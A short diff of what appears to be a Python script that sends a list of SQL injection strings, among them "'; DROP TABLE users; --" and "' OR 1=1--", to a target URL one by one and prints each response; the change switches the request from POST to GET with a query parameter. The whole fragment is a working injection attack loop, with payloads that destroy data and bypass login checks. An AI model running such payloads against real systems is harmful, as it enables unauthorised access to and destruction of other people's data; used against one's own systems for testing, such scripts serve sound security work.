@@ -6,6 +6,7 @@ sql_injections = ["'; DROP TABLE users; --", "' OR 1=1--", "' OR '1'='1", "' OR 
 
 for injection in sql_injections:
     payload = {"query": injection}
-    response = requests.post(url, data=payload)
+    response = requests.get(url, params={"q": injection})
+    print(response)
     # print(f"Payload: {injection} | Response Code: {response.status_code}")
     
